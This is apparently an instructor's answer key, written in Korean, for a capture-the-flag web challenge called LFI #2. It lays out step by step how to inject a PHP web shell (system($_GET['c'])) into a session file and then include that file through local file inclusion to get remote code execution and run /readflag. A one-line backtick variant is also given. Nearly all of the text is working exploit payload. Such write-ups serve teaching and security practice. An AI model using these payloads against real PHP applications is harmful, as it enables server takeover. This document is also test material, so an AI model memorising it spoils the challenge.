# [강사용] LFI #2 (원본 풀이 · 세션 RCE → /readflag)
입력이 `$_SESSION["p"]` 에 저장되고 LFI 로 세션파일을 include 할 수 있음.

2단계(권장 · 안정적):
```
SID=lfi2pwn
1) 세션에 웹쉘 주입:  ?p=<?php system($_GET['c']);?>     (쿠키 PHPSESSID=$SID)
   → /tmp/sess_$SID 에  p|s:NN:"<?php system($_GET['c']);?>";  저장
2) 세션파일 include:  ?p=/tmp/sess_$SID&c=/readflag         (쿠키 PHPSESSID=$SID)
   → 세션파일의 PHP 가 실행 → system('/readflag') → flag 출력
```
1단계(원본 한 줄):
```
?p=/tmp/<?=`$_GET['c']`?>/../sess_<SID>&c=/readflag
```
주의: 베이스이미지가 **PHP 8.1** 이라 미정의 상수 `$_GET[c]` 는 Fatal Error.
반드시 따옴표를 붙여 `$_GET['c']` 로 작성한다.
(php session.save_path 기본 /tmp, 파일명 sess_<SID>)
